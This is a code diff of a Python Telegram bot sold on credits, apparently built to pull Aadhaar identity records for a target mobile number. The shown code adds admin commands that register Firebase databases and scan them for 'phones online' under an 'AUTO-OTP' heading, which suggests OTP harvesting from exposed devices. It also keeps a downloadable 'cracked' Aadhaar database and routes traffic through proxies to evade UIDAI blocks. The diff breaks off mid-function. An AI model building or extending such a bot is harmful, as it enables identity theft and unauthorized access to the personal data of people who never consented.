@@ -2,6 +2,7 @@ import os
 import sys
 import importlib
 import asyncio
+import aiohttp
 
 # --- REQUIREMENT CHECKER START ---
 REQUIRED_MODULES = {
@@ -11,7 +12,8 @@ REQUIRED_MODULES = {
     "dotenv": "python-dotenv",
     "ddddocr": "ddddocr",
     "fitz": "pymupdf",
-    "phonenumbers": "phonenumbers"
+    "phonenumbers": "phonenumbers",
+    "aiohttp": "aiohttp"
 }
 
 REQUIRED_FILES = {
@@ -27,9 +29,9 @@ def check_startup_requirements():
     print("📋 ========================================================")
     print("        AADHAAR TELEGRAM BOT - STARTUP VERIFICATION        ")
     print("============================================================")
-    
+
     base_dir = os.path.dirname(os.path.abspath(__file__))
-    
+
     # 1. Check Python Package Modules
     print("\n📦 Verifying Python Package Dependencies:")
     print("------------------------------------------------------------")
@@ -41,7 +43,6 @@ def check_startup_requirements():
         except ImportError:
             print(f"  🔴 {pip_name:<20} -> MISSING")
             missing_packages.append(pip_name)
-            
 
     # 3. Check Vital Files and Folders
     print("\n📂 Verifying Core Codebase Files:")
@@ -54,7 +55,7 @@ def check_startup_requirements():
         else:
             print(f"  🔴 {file_name:<22} -> MISSING ({desc})")
             missing_files.append(file_name)
-            
+
     # 4. Check Environment Configuration
     print("\n🔑 Verifying Environment Settings (.env):")
     print("------------------------------------------------------------")
@@ -64,7 +65,7 @@ def check_startup_requirements():
         print("  🟢 .env Configuration File -> FOUND")
         with open(env_path, "r", encoding="utf-8") as f:
             env_content = f.read()
-            
+
         token_found = False
         admin_found = False
         for line in env_content.splitlines():
@@ -77,12 +78,12 @@ def check_startup_requirements():
                 val = line.split("=", 1)[1].strip().replace("'", "").replace('"', '')
                 if val:
                     admin_found = True
-                    
+
         if token_found:
             print("  🟢 TELEGRAM_BOT_TOKEN      -> CONFIGURED")
         else:
             print("  🔴 TELEGRAM_BOT_TOKEN      -> MISSING OR EMPTY")
-            
+
         if admin_found:
             print("  🟢 ADMIN_IDS               -> CONFIGURED")
         else:
@@ -91,7 +92,7 @@ def check_startup_requirements():
         print("  🔴 .env Configuration File -> MISSING")
         token_found = False
         admin_found = False
-    
+
     # 5. Check proxies.txt (optional but recommended)
     print("\n🌐 Verifying Proxy Configuration:")
     print("------------------------------------------------------------")
@@ -105,36 +106,36 @@ def check_startup_requirements():
             print(f"  🟡 proxies.txt             -> FOUND (read error: {e})")
     else:
         print("  🟡 proxies.txt             -> NOT FOUND (running direct, may fail on UIDAI datacenter block)")
-        
+
     print("============================================================\n")
-    
+
     has_errors = (
-        len(missing_packages) > 0 
-        or len(missing_files) > 0 
-        or not env_exists 
+        len(missing_packages) > 0
+        or len(missing_files) > 0
+        or not env_exists
         or not token_found
     )
-    
+
     if has_errors:
         print("❌ STARTUP ERROR: Critical requirements are missing!")
         print("👇 Please execute the following commands to resolve the errors:\n")
-        
+
         if len(missing_packages) > 0:
             print("👉 1. Install missing Python dependencies:")
             print(f"   Command: pip install {' '.join(missing_packages)}\n")
-            
+
         if len(missing_files) > 0:
             print("👉 2. Restore missing core codebase files:")
             for f in missing_files:
                 print(f"   - {f} ({REQUIRED_FILES[f]})")
             print("   Please check your repository to restore these files.\n")
-            
+
         if not env_exists or not token_found:
             print("👉 3. Configure environment settings:")
             print("   Create a '.env' file in the bot root folder containing:")
             print("   TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE")
             print("   ADMIN_IDS=ADMIN_ID_1,ADMIN_ID_2\n")
-            
+
         print("============================================================")
         sys.exit(1)
     else:
@@ -199,7 +200,7 @@ class BotExceptionHandler(telebot.ExceptionHandler):
     def handle(self, exception):
         print(f"⚠️ [TELEBOT EXCEPTION] Handled seamlessly: {exception}")
         if "getaddrinfo failed" in str(exception) or "NewConnectionError" in str(exception) or "Max retries exceeded" in str(exception):
-            time.sleep(5) # Prevent log spam if internet connection drops
+            time.sleep(5)  # Prevent log spam if internet connection drops
         return True
 
 # Prevent idle socket timeouts by refreshing the HTTP session periodically
@@ -278,7 +279,8 @@ bot.send_document = safe_send_document
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 user_states = {}
-loop = None # Global loop reference
+loop = None  # Global loop reference
+
 
 def check_user_joined(chat_id):
     """
@@ -292,7 +294,7 @@ def check_user_joined(chat_id):
         return True
     if not REQUIRED_CHANNELS:
         return True
-        
+
     for channel in REQUIRED_CHANNELS:
         try:
             member = bot.get_chat_member(chat_id=channel, user_id=chat_id)
@@ -308,24 +310,25 @@ def check_user_joined(chat_id):
         except Exception as e:
             # If bot cannot check (e.g. general exception), log it and bypass
             print(f"⚠️ [JOIN CHECK] Failed to check channel {channel} for user {chat_id}: {e}")
-            
+
     return True
+
 
 def prompt_join_channels(chat_id):
     """
     Sends a message to the user prompting them to join the required channels.
     """
     markup = types.InlineKeyboardMarkup(row_width=1)
-    
+
     join_text = "⚠️ <b>Join Required Channels</b>\n\nBot ko use karne ke liye aapko niche diye gaye channels ko join karna zaroori hai:\n"
-    
+
     for idx, channel in enumerate(REQUIRED_CHANNELS, 1):
         url = None
         title = f"Channel {idx}"
         try:
             chat_info = bot.get_chat(channel)
             title = chat_info.title or f"Channel {idx}"
-            
+
             if chat_info.username:
                 url = f"https://t.me/{chat_info.username}"
             elif chat_info.invite_link:
@@ -339,19 +342,21 @@ def prompt_join_channels(chat_id):
                     url = f"https://t.me/c/{str(channel).replace('-100', '')}"
         except Exception as e:
             print(f"⚠️ [JOIN CHECK] Error getting chat info for {channel}: {e}")
-            url = f"https://t.me/DARKVENDOR07" # Fallback to developer
-                
+            url = f"https://t.me/DARKVENDOR07"  # Fallback to developer
+
         btn = types.InlineKeyboardButton(f"📢 Join {title}", url=url)
         markup.add(btn)
-            
+
     # Add a check button to re-verify join status
     btn_check = types.InlineKeyboardButton("🔄 Re-Verify / Start", callback_data="check_joined_status")
     markup.add(btn_check)
-    
+
     bot.send_message(chat_id, join_text, reply_markup=markup, parse_mode='HTML')
+
 
 def esc(s):
     return str(s or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+
 
 def get_ui_card(step_num, title, description, target=None, show_tip=True):
     body = ""
@@ -359,13 +364,13 @@ def get_ui_card(step_num, title, description, target=None, show_tip=True):
         body += f"📱 <b>STEP {step_num}/4: {title}</b>\n\n"
     else:
         body += f"⭐ <b>{title}</b>\n\n"
-        
+
     body += f"{description}\n"
-    
+
     if target:
         body += "\n━━━━━━━━━━━━━━━━━━━━━━\n"
         body += f"📱 <b>Target Mobile:</b> <code>{target}</code>\n"
-            
+
     if show_tip:
         body += (
             "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -373,8 +378,9 @@ def get_ui_card(step_num, title, description, target=None, show_tip=True):
         )
     else:
         body += "━━━━━━━━━━━━━━━━━━━━━━"
-        
+
     return body
+
 
 def send_zero_credits_dashboard(chat_id, message_id=None):
     try:
@@ -382,24 +388,24 @@ def send_zero_credits_dashboard(chat_id, message_id=None):
     except Exception as e:
         print(f"⚠️ Failed to get bot username: {e}")
         bot_username = "bot"
-        
+
     referral_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
-    
+
     data = stats_manager.load_stats()
-    
+
     # Find user record in stats.json
     user_record = None
     for u in data.get("users", []):
         if isinstance(u, dict) and str(u.get("chat_id")) == str(chat_id):
             user_record = u
             break
-            
+
     join_date = user_record.get("joined", "N/A") if user_record else "N/A"
-    
+
     # Success count
     history = data.get("cracked_history", [])
     success_count = sum(1 for r in history if str(r.get("chat_id")) == str(chat_id))
-    
+
     # Referred count
     referred_count = 0
     for u in data.get("users", []):
@@ -407,7 +413,7 @@ def send_zero_credits_dashboard(chat_id, message_id=None):
             ref_by = u.get("referred_by")
             if ref_by is not None and str(ref_by) == str(chat_id):
                 referred_count += 1
-            
+
     zero_credits_text = (
         "⚠️ <b>NO CREDITS REMAINING!</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -426,12 +432,12 @@ def send_zero_credits_dashboard(chat_id, message_id=None):
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "💬 Admin/Developer se credits lene ke liye niche direct click karein."
     )
-    
+
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn_buy = types.InlineKeyboardButton("👨‍💻 Contact Admin", url=f"https://t.me/{DEVELOPER_USERNAME}")
     btn_refresh = types.InlineKeyboardButton("🔄 Refresh Credits", callback_data="refresh_zero_credits")
     markup.add(btn_buy, btn_refresh)
-    
+
     if message_id:
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=zero_credits_text, reply_markup=markup, parse_mode='HTML')
@@ -444,14 +450,14 @@ def send_zero_credits_dashboard(chat_id, message_id=None):
 
 def send_welcome_dashboard(chat_id, message_id=None):
     mode = stats_manager.get_bot_mode()
-    
+
     credits_info = ""
     if mode == "paid":
         credits = stats_manager.get_user_credits(chat_id)
         credits_info = f"\n💳 <b>Credits Left:</b> <code>{credits}</code>\n"
     else:
         credits_info = f"\n💳 <b>Credits Left:</b> <code>Unlimited</code>\n"
-        
+
     welcome_text = (
         "👋 <b>Welcome to the Aadhaar BOT!</b>\n"
         "Extract Aadhaar details and generate decrypted PDFs instantly.\n"
@@ -462,7 +468,7 @@ def send_welcome_dashboard(chat_id, message_id=None):
     btn_dev = types.InlineKeyboardButton("👨‍💻 Developer", url=f"https://t.me/{DEVELOPER_USERNAME}")
     btn_start = types.InlineKeyboardButton("🚀 Start", callback_data="start_bypass")
     markup.add(btn_dev, btn_start)
-    
+
     if message_id:
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=welcome_text, reply_markup=markup, parse_mode='HTML')
@@ -472,10 +478,11 @@ def send_welcome_dashboard(chat_id, message_id=None):
     else:
         bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='HTML')
 
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     chat_id = message.chat.id
-    
+
     # Handle referral rewards first
     parts = message.text.split()
     referrer_id = None
@@ -486,12 +493,12 @@ def send_welcome(message):
             pass
 
     is_new_user = not stats_manager.is_user_registered(chat_id)
-    
+
     try:
         stats_manager.register_visit(chat_id, username=message.from_user.username, first_name=message.from_user.first_name)
     except Exception as e:
         print(f"⚠️ [STATS] Failed to register visit: {e}")
-        
+
     if is_new_user and referrer_id and referrer_id != chat_id:
         try:
             stats_manager.add_user_credits(referrer_id, 1)
@@ -502,14 +509,14 @@ def send_welcome(message):
                     u["referred_by"] = referrer_id
                     break
             stats_manager.save_stats(data)
-            
+
             # Send notification to the referrer
             new_user_name = message.from_user.first_name or "Someone"
             ref_notify = f"User named {new_user_name} joined through your link and you got 1 credit"
             bot.send_message(referrer_id, ref_notify)
         except Exception as ref_err:
             print(f"⚠️ [REFERRAL] Error rewarding referrer {referrer_id}: {ref_err}")
-        
+
     # Check Channel Join Status
     if not check_user_joined(chat_id):
         prompt_join_channels(chat_id)
@@ -525,7 +532,7 @@ def send_welcome(message):
         )
         bot.send_message(chat_id, warn_msg, parse_mode='HTML')
         return
-        
+
     user_states[chat_id] = {'step': 'IDLE'}
     send_welcome_dashboard(chat_id)
 
@@ -571,33 +578,34 @@ def handle_start_bypass(call):
     except:
         bot.send_message(chat_id, step1_text, parse_mode='HTML')
 
+
 def get_admin_dashboard_markup():
     markup = types.InlineKeyboardMarkup(row_width=2)
-    
+
     # Configuration Deck
     mode = stats_manager.get_bot_mode()
     mode_btn_text = "🔓 Toggle Mode: FREE" if mode == "free" else "🔒 Toggle Mode: PAID"
     btn_toggle_mode = types.InlineKeyboardButton(mode_btn_text, callback_data="admin_toggle_mode")
     btn_set_def_credits = types.InlineKeyboardButton("💳 Default Credits", callback_data="admin_set_default_credits")
-    
+
     # New Dynamic Controls
     btn_sys_settings = types.InlineKeyboardButton("⚙️ System Settings", callback_data="admin_settings_menu")
     btn_view_recent_cracks = types.InlineKeyboardButton("👁 View Recent Cracks", callback_data="admin_view_recent_cracks")
-    
+
     # Management Deck
     btn_grant_credits = types.InlineKeyboardButton("➕ Grant Credits", callback_data="admin_grant_credits")
     btn_broadcast = types.InlineKeyboardButton("📢 Broadcast Msg", callback_data="admin_broadcast")
-    
+
     # Reports & Navigation Deck
     btn_view_users = types.InlineKeyboardButton("👥 View Users", callback_data="admin_view_users_page_1")
     btn_export_users = types.InlineKeyboardButton("📥 Export User List", callback_data="admin_download_users")
-    
+
     btn_view_logs = types.InlineKeyboardButton("👁 View Error Logs", callback_data="admin_view_logs")
     btn_export_logs = types.InlineKeyboardButton("📥 Export Error Logs", callback_data="admin_download_logs")
-    
+
     btn_cracked = types.InlineKeyboardButton("📂 Download Cracked Database", callback_data="admin_download_cracked")
     btn_stats = types.InlineKeyboardButton("🔄 Refresh Console", callback_data="admin_stats")
-    
+
     # Arrange in a gorgeous, app-like visual grid
     markup.add(btn_toggle_mode, btn_set_def_credits)
     markup.add(btn_sys_settings, btn_view_recent_cracks)
@@ -608,10 +616,12 @@ def get_admin_dashboard_markup():
     markup.add(btn_stats)
     return markup
 
+
 def send_admin_dashboard(chat_id):
     summary = stats_manager.get_stats_summary(user_states)
     markup = get_admin_dashboard_markup()
     bot.send_message(chat_id, summary, reply_markup=markup, parse_mode='HTML')
+
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
 def handle_admin_callbacks(call):
@@ -620,10 +630,10 @@ def handle_admin_callbacks(call):
         try: bot.answer_callback_query(call.id, "Access Denied!")
         except: pass
         return
-        
+
     try: bot.answer_callback_query(call.id)
     except: pass
-    
+
     action = call.data
     if action == "admin_stats":
         summary = stats_manager.get_stats_summary(user_states)
@@ -631,7 +641,7 @@ def handle_admin_callbacks(call):
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=summary, reply_markup=markup, parse_mode='HTML')
         except: pass
-        
+
     elif action == "admin_settings_menu":
         cooldown = stats_manager.get_cooldown_seconds()
         max_concurrent = stats_manager.get_max_concurrent_tasks()
@@ -702,7 +712,7 @@ def handle_admin_callbacks(call):
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
         except: pass
-        
+
     elif action == "admin_toggle_mode":
         current_mode = stats_manager.get_bot_mode()
         new_mode = "paid" if current_mode == "free" else "free"
@@ -718,7 +728,7 @@ def handle_admin_callbacks(call):
         cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
         cancel_markup.add("Cancel")
         bot.send_message(chat_id, "💳 <b>Set Default Credits</b>\n\n👇 Please enter the default credits count for new users:\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
-        
+
     elif action == "admin_grant_credits":
         user_states[chat_id] = {'step': 'AWAITING_ADMIN_GRANT_USER_ID'}
         cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
@@ -730,13 +740,13 @@ def handle_admin_callbacks(call):
         cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
         cancel_markup.add("Cancel")
         bot.send_message(chat_id, "📢 <b>Broadcast Command Triggered</b>\n\n👇 Kripya niche text, image, document ya forward message send karein jo aap saare bot users ko bhejna chahte hain.\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
-        
+
     elif action == "admin_download_cracked":
         bot.send_message(chat_id, "⏳ <b>Fetching Cracked Data Database Report...</b>", parse_mode='HTML')
         import shutil
         permanent_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_history.txt")
         temp_report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_history_temp.txt")
-        
+
         if os.path.exists(permanent_path) and os.path.getsize(permanent_path) > 0:
             try:
                 shutil.copy(permanent_path, temp_report_path)
@@ -746,7 +756,7 @@ def handle_admin_callbacks(call):
                 report_path = stats_manager.get_cracked_data_file_path()
         else:
             report_path = stats_manager.get_cracked_data_file_path()
-            
+
         if report_path and os.path.exists(report_path):
             with open(report_path, 'rb') as f:
                 bot.send_document(chat_id, f, caption="📂 <b>Cracked Aadhaar Database Log</b>")
@@ -754,7 +764,7 @@ def handle_admin_callbacks(call):
             except: pass
         else:
             bot.send_message(chat_id, "❌ Failed to generate report or database is empty.", parse_mode='HTML')
-            
+
     elif action == "admin_download_users":
         bot.send_message(chat_id, "⏳ <b>Generating User List...</b>", parse_mode='HTML')
         data = stats_manager.load_stats()
@@ -782,7 +792,7 @@ def handle_admin_callbacks(call):
                 bot.send_document(chat_id, f, caption=f"👤 <b>Registered Bot Users List ({len(users)} users)</b>")
             try: os.remove(users_file)
             except: pass
- 
+
     elif action == "admin_download_logs":
         bot.send_message(chat_id, "⏳ <b>Fetching Secure Error Logs...</b>", parse_mode='HTML')
         log_path = stats_manager.get_error_log_file_path()
@@ -797,16 +807,16 @@ def handle_admin_callbacks(call):
             page = int(action.split("_")[-1])
         except:
             page = 1
-            
+
         data = stats_manager.load_stats()
         users = data.get("users", [])
-        
+
         if not users:
             try:
                 bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ No registered users found in the database.", reply_markup=get_admin_dashboard_markup(), parse_mode='HTML')
             except: pass
             return
-            
+
         PAGE_SIZE = 5
         total_users = len(users)
         total_pages = max(1, (total_users + PAGE_SIZE - 1) // PAGE_SIZE)
@@ -814,10 +824,10 @@ def handle_admin_callbacks(call):
         start_idx = (page - 1) * PAGE_SIZE
         end_idx = start_idx + PAGE_SIZE
         page_users = users[start_idx:end_idx]
-        
+
         msg_text = f"👥 <b>USER MANAGEMENT DECK (Page {page}/{total_pages})</b>\n"
         msg_text += "━━━━━━━━━━━━━━━━━━━━━━\n"
-        
+
         def_credits = stats_manager.get_default_credits()
         for idx, u in enumerate(page_users, start=start_idx + 1):
             if isinstance(u, dict):
@@ -826,10 +836,10 @@ def handle_admin_callbacks(call):
                 uname = u.get("username", "N/A")
                 joined = u.get("joined", "N/A")
                 credits = u.get("credits", def_credits)
-                
+
                 uname_str = f" (@{uname})" if uname and uname != "N/A" else ""
                 credit_status = f"<code>{credits} 💳</code>" if credits > 0 else "<code>0 💳</code> (Exhausted ❌)"
-                
+
                 msg_text += (
                     f"👤 <b>{idx}. {fname}</b>{uname_str}\n"
                     f"  ├─ 🆔 ID: <code>{cid}</code>\n"
@@ -838,29 +848,29 @@ def handle_admin_callbacks(call):
                 )
             else:
                 msg_text += f"🆔 User ID: <code>{u}</code>\n──────────────────────\n\n"
-                
+
         msg_text += "━━━━━━━━━━━━━━━━━━━━━━\n"
         msg_text += f"Total registered users: <b>{total_users}</b>"
-        
+
         markup = types.InlineKeyboardMarkup(row_width=2)
         nav_buttons = []
         if page > 1:
             nav_buttons.append(types.InlineKeyboardButton("⬅️ Previous", callback_data=f"admin_view_users_page_{page-1}"))
         if page < total_pages:
             nav_buttons.append(types.InlineKeyboardButton("➡️ Next", callback_data=f"admin_view_users_page_{page+1}"))
-            
+
         if nav_buttons:
             markup.add(*nav_buttons)
-            
+
         btn_export = types.InlineKeyboardButton("📥 Export Users List", callback_data="admin_download_users")
         btn_back = types.InlineKeyboardButton("🔙 Back to Dashboard", callback_data="admin_stats")
         markup.add(btn_export, btn_back)
-        
+
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
         except Exception as e:
             print(f"⚠️ [ADMIN] Error editing message to show users: {e}")
- 
+
     elif action == "admin_view_logs":
         log_path = stats_manager.get_error_log_file_path()
         if not log_path or not os.path.exists(log_path):
@@ -869,20 +879,20 @@ def handle_admin_callbacks(call):
             try:
                 with open(log_path, 'r', encoding='utf-8') as f:
                     lines = f.readlines()
-                
+
                 # Fetch last 10 error lines
                 last_lines = [line.strip() for line in lines if line.strip()][-10:]
-                
+
                 msg_text = f"⚠️ <b>SYSTEM DIAGNOSTIC LOGS (Last {len(last_lines)})</b>\n"
                 msg_text += "━━━━━━━━━━━━━━━━━━━━━━\n"
-                
+
                 for line in last_lines:
                     # Log format: [TIMESTAMP] User: FIRSTNAME (@USERNAME) [ID: CHATID] | Error: MSG
                     try:
                         timestamp_part, rest = line.split("] User: ", 1)
                         timestamp = timestamp_part.replace("[", "")
                         user_info_part, error_part = rest.split(" | Error: ", 1)
-                        
+
                         msg_text += (
                             f"📅 <code>{timestamp}</code>\n"
                             f"👤 <b>User:</b> <code>{user_info_part}</code>\n"
@@ -891,35 +901,36 @@ def handle_admin_callbacks(call):
                         )
                     except:
                         msg_text += f"▪️ <code>{line}</code>\n──────────────────────\n"
-                
+
                 msg_text += "━━━━━━━━━━━━━━━━━━━━━━"
             except Exception as e:
                 msg_text = f"❌ <b>Error reading log file:</b> <code>{e}</code>"
-                
+
         markup = types.InlineKeyboardMarkup(row_width=2)
         btn_refresh = types.InlineKeyboardButton("🔄 Refresh Logs", callback_data="admin_view_logs")
         btn_export = types.InlineKeyboardButton("📥 Export Logs", callback_data="admin_download_logs")
         btn_back = types.InlineKeyboardButton("🔙 Back to Dashboard", callback_data="admin_stats")
         markup.add(btn_refresh, btn_export)
         markup.add(btn_back)
-        
+
         try:
             bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, reply_markup=markup, parse_mode='HTML')
         except Exception as e:
             print(f"⚠️ [ADMIN] Error editing message to show logs: {e}")
+
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('mp|'))
 def handle_manual_pref_selection(call):
     chat_id = call.message.chat.id
     try: bot.answer_callback_query(call.id)
     except: pass
-    
+
     parts = call.data.split('|')
     action = parts[1]
-    
+
     state = user_states.get(chat_id, {})
     number = state.get('num', '')
-    
+
     if action == 'manual':
         user_states[chat_id] = {'step': 'AWAITING_NAME', 'num': number, 'prefix': ''}
         prompt_text = "Send me the <b>Aadhaar Holder Name</b> exactly as printed on the card."
@@ -940,7 +951,7 @@ def handle_manual_pref_selection(call):
         # Male or Female selected directly -> Bypass Name and DOB steps!
         name = "Mr" if action == "Mr." else "Mrs"
         dob = None
-        
+
         status_msg = get_ui_card(
             step_num="3",
             title="EID Retrieval",
@@ -953,14 +964,14 @@ def handle_manual_pref_selection(call):
             )
         except:
             bot.send_message(chat_id, status_msg, parse_mode='HTML')
-            
+
         user_states[chat_id] = {'step': 'PROCESSING'}
-        
+
         user_info = {
             'username': call.from_user.username or 'N/A',
             'first_name': call.from_user.first_name or 'N/A'
         }
-        
+
         asyncio.run_coroutine_threadsafe(execute_and_reset(chat_id, name, number, dob, user_info=user_info), loop)
 
 
@@ -970,14 +981,14 @@ def handle_refresh_zero_credits(call):
     try:
         bot.answer_callback_query(call.id, text="Checking credits...", show_alert=False)
     except: pass
-    
+
     is_admin = chat_id in ADMIN_IDS
     mode = stats_manager.get_bot_mode()
-    
+
     if is_admin or mode == "free":
         send_welcome_dashboard(chat_id, message_id=call.message.message_id)
         return
-        
+
     credits = stats_manager.get_user_credits(chat_id)
     if credits > 0:
         try:
@@ -1015,26 +1026,26 @@ def callback_query(call):
 @bot.message_handler(commands=['profile'])
 def handle_profile(message):
     chat_id = message.chat.id
-    
+
     # Check Channel Join Status
     if not check_user_joined(chat_id):
         prompt_join_channels(chat_id)
         return
-        
+
     try:
         str_chat_id = int(chat_id)
     except:
         str_chat_id = chat_id
-        
+
     data = stats_manager.load_stats()
-    
+
     # Find user in users list
     user_record = None
     for u in data.get("users", []):
         if isinstance(u, dict) and u.get("chat_id") == str_chat_id:
             user_record = u
             break
-            
+
     # Fallback or create if not exists
     if not user_record:
         try:
@@ -1045,17 +1056,17 @@ def handle_profile(message):
                     user_record = u
                     break
         except: pass
-                
+
     join_date = user_record.get("joined", "N/A") if user_record else "N/A"
     credits = stats_manager.get_user_credits(chat_id)
     mode = stats_manager.get_bot_mode()
-    
+
     # Count success cracks from history
     history = data.get("cracked_history", [])
     success_count = sum(1 for r in history if r.get("chat_id") == str_chat_id)
-    
+
     credits_str = "Unlimited 💳" if mode == "free" else f"{credits} 💳"
-    
+
     profile_text = (
         "👤 <b>USER PROFILE DASHBOARD</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1069,29 +1080,30 @@ def handle_profile(message):
     )
     bot.send_message(chat_id, profile_text, parse_mode='HTML')
 
+
 @bot.message_handler(commands=['refer'])
 def handle_refer(message):
     chat_id = message.chat.id
-    
+
     # Check Channel Join Status
     if not check_user_joined(chat_id):
         prompt_join_channels(chat_id)
         return
-        
+
     try:
         bot_username = bot.get_me().username
     except Exception as e:
         print(f"⚠️ Failed to get bot username: {e}")
         bot_username = "bot"
-        
+
     referral_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
-    
+
     data = stats_manager.load_stats()
     referred_count = 0
     for u in data.get("users", []):
         if isinstance(u, dict) and u.get("referred_by") == chat_id:
             referred_count += 1
-            
+
     refer_text = (
         "🤝 <b>REFERRAL & INVITE SYSTEM</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1104,6 +1116,7 @@ def handle_refer(message):
     )
     bot.send_message(chat_id, refer_text, parse_mode='HTML')
 
+
 @bot.message_handler(commands=['admin'])
 def handle_admin(message):
     chat_id = message.chat.id
@@ -1112,19 +1125,20 @@ def handle_admin(message):
         return
     send_admin_dashboard(chat_id)
 
+
 def perform_broadcast(message):
     admin_chat_id = message.chat.id
     data = stats_manager.load_stats()
     users = data.get("users", [])
-    
+
     success = 0
     failed = 0
     total = len(users)
-    
+
     if total == 0:
         bot.send_message(admin_chat_id, "⚠️ Broadcast completed: No users found in database.")
         return
-        
+
     start_time = time.time()
     for u in users:
         if isinstance(u, dict):
@@ -1136,11 +1150,11 @@ def perform_broadcast(message):
         try:
             bot.copy_message(chat_id=user_id, from_chat_id=admin_chat_id, message_id=message.message_id)
             success += 1
-            time.sleep(0.05) # 20 messages per second rate limiting
+            time.sleep(0.05)  # 20 messages per second rate limiting
         except Exception as e:
             print(f"⚠️ [BROADCAST] Failed to send to {user_id}: {e}")
             failed += 1
-            
+
     elapsed = int(time.time() - start_time)
     report = (
         "📢 <b>Broadcast Completed!</b>\n"
@@ -1152,6 +1166,525 @@ def perform_broadcast(message):
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
     bot.send_message(admin_chat_id, report, parse_mode='HTML')
+
+
+# ==============================================================================
+# 🔥 FIREBASE COMMANDS
+# ==============================================================================
+
+@bot.message_handler(commands=['addfire'])
+def cmd_addfire(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.send_message(chat_id, "ℹ️ <b>Usage:</b> <code>/addfire https://your-db.firebaseio.com/</code>", parse_mode='HTML')
+        return
+
+    success, msg = aadhaar_engine.firebase_add_link(parts[1].strip(), added_by=chat_id)
+    bot.send_message(chat_id, msg, parse_mode='HTML')
+
+
+@bot.message_handler(commands=['removefire'])
+def cmd_removefire(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.send_message(chat_id, "ℹ️ <b>Usage:</b> <code>/removefire URL</code> or <code>/removefire all</code>", parse_mode='HTML')
+        return
+
+    count, msg = aadhaar_engine.firebase_remove_link(parts[1].strip())
+    bot.send_message(chat_id, msg, parse_mode='HTML')
+
+
+@bot.message_handler(commands=['listfire'])
+def cmd_listfire(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+    bot.send_message(chat_id, aadhaar_engine.firebase_list_text(), parse_mode='HTML')
+
+
+# ==============================================================================
+# 📱 AUTO-OTP COMMANDS
+# ==============================================================================
+
+@bot.message_handler(commands=['scan'])
+def cmd_scan(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(chat_id, "📭 No Firebase links configured. Use <code>/addfire URL</code> first.", parse_mode='HTML')
+        return
+
+    status = bot.send_message(chat_id, "🔍 <b>Scanning Firebase links...</b>", parse_mode='HTML')
+
+    async def run_scan():
+        async with aiohttp.ClientSession() as session:
+            lines = ["🔥 <b>FIREBASE SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
+            total_phones = 0
+            for entry in links:
+                url = entry.get("url", "")
+                short = url.replace("https://", "").replace("http://", "").rstrip("/")
+                try:
+                    mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=40)
+                    if mapping:
+                        total_phones += len(mapping)
+                        lines.append(f"🔗 <code>{short}</code>")
+                        lines.append(f"   📱 <b>{len(mapping)}</b> phone(s) online")
+                        for ph in list(mapping.keys())[:5]:
+                            lines.append(f"      ├ <code>{ph}</code>")
+                        if len(mapping) > 5:
+                            lines.append(f"      └ … +{len(mapping)-5} more")
+                    else:
+                        lines.append(f"🔗 <code>{short}</code>\n   ⚠️ No phones found")
+                except Exception as e:
+                    lines.append(f"🔗 <code>{short}</code>\n   ❌ {e}")
+            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+            lines.append(f"📊 <b>Total phones online:</b> {total_phones}")
+            report = "\n".join(lines)
+            try:
+                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=report, parse_mode='HTML')
+            except:
+                bot.send_message(chat_id, report, parse_mode='HTML')
+
+    try:
+        asyncio.run_coroutine_threadsafe(run_scan(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Scan error: {e}")
+
+
+@bot.message_handler(commands=['auto'])
+def cmd_auto(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
